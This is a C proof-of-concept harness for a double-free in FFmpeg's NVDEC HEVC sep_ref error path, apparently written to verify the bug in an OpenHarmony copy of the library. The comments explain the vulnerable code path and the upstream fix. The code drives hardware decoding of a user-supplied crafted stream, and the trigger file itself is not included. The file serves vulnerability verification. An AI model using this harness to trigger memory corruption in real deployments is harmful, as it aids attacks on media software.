/*
 * CVE-2026-64832 运行验证 PoC 驱动 — third_party/ffmpeg nvdec sep_ref 池
 * 耗尽路径 double-free
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavcodec/nvdec.c 与上游
 * n7.1.1 逐字节一致（diff 为空；ff_refstruct_pool_get 与上游补丁上下文的
 * av_refstruct_pool_get 为 ff_->av_ 更名同 API，结构等价，见 case.json
 * oh_source.l4_evidence）。上游修复 4c6217477fc6 删除 sep_ref 错误路径上
 * 对 fdd 所属上下文的重复释放。
 *
 * 触发原理：ff_nvdec_start_frame_sep_ref（nvdec.c:599 起）在解码器 surface
 * 池耗尽分支保留 `ret = AVERROR(ENOMEM); goto fail;`，而尾部
 * `fail: nvdec_fdd_priv_free(cf); return ret;` 会再次释放
 * ff_nvdec_start_frame 已交给帧的 fdd 上下文——double free。
 *
 * 用法：./poc_nvdec <输入.hevc> [--low-surfaces]
 *
 * 环境门槛（如实申报）：运行级观测需要 NVIDIA GPU + NVDEC 能力构建
 * （--enable-cuda-nvcc / --enable-cuda-llvm，且宿主存在
 * /dev/nvidia* 与 libnvidia-encode/decode）。触发流形态：H.265 多参考帧
 * 序列在低 surface 配置下耗尽 sep_ref 池（上游修复 commit 所述 crafted
 * video file）。本驱动完成 hwdevice/hwaccel 建链与逐包解码循环，将
 * avcodec 日志调至 debug 以观测 pool 耗尽与 fail 路径；无 GPU 环境下
 * 返回明确的环境错误码（exit 5），不冒充复现。
 *
 * 判读：ASan/Valgrind 构建下观测 nvdec_fdd_priv_free 的 double-free
 * （attempting double-free / 重复 unref 同一 fdd 指针）；应用上游
 * 同型修复后同输入不再走重复释放。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavutil/error.h"
#include "libavutil/hwcontext.h"

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <input.hevc> [--low-surfaces]\n", argv[0]); return 2; }

    int use_hw = 1;
    AVBufferRef *hw_device_ctx = NULL;
    if (av_hwdevice_ctx_create(&hw_device_ctx, AV_HWDEVICE_TYPE_CUDA, NULL, NULL, 0) < 0) {
        fprintf(stderr, "case=nvdec NO_CUDA_DEVICE（本机无 NVIDIA GPU/NVDEC 环境，"
                        "运行级观测需 GPU 宿主，见文件头"环境门槛"）\n");
        use_hw = 0;
    }

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_HEVC);
    if (!codec) { fprintf(stderr, "hevc decoder not built\n"); return 3; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 4;
    if (use_hw) {
        ctx->hw_device_ctx = av_buffer_ref(hw_device_ctx);
        ctx->hwaccel_flags |= AV_HWACCEL_FLAG_IGNORE_LEVEL;
    }
    av_log_set_level(AV_LOG_DEBUG);
    if (avcodec_open2(ctx, codec, NULL) < 0) { fprintf(stderr, "open failed\n"); return 5; }

    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 6; }
    AVPacket *packet = av_packet_alloc();
    AVFrame *frame = av_frame_alloc();
    int npackets = 0, nframes = 0, last = 0;
    uint8_t chunk[65536];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        /* 简化馈送：按块送包（Annex B 流按块解码足以驱动帧路径） */
        av_new_packet(packet, (int)n);
        memcpy(packet->data, chunk, n);
        last = avcodec_send_packet(ctx, packet);
        if (last < 0 && last != AVERROR(EAGAIN)) break;
        npackets++;
        while (avcodec_receive_frame(ctx, frame) >= 0) nframes++;
    }
    fclose(f);
    printf("case=nvdec packets=%d frames=%d last=%d（%s）\n",
           npackets, nframes, last,
           use_hw ? "hw 路径" : "sw 回退路径，非复现口径");
    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&ctx);
    if (hw_device_ctx) av_buffer_unref(&hw_device_ctx);
    return use_hw ? 0 : 5;
}
